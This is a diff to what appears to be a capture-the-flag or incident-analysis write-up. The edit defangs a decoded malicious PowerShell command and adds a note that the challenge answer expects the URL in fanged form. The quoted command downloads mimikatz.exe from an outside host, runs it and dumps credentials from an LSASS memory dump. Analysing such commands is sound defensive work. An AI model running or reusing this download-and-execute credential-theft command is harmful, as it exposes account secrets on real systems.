@@ -330,7 +330,9 @@ We now have found an extremely suspicious PS command, lets decode it with the ba
 
 And we have found the malicous command and the Invoke Web Request cmdlet we were expecting earlier:
 
-**Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait****
+**Invoke-WebRequest -Uri "hxxp://voltyp[.]com/3/tlz/mimikatz[.]exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait****
+
+*Note I have defanged the URL, the answer expects the url to be fanged
 
 
 
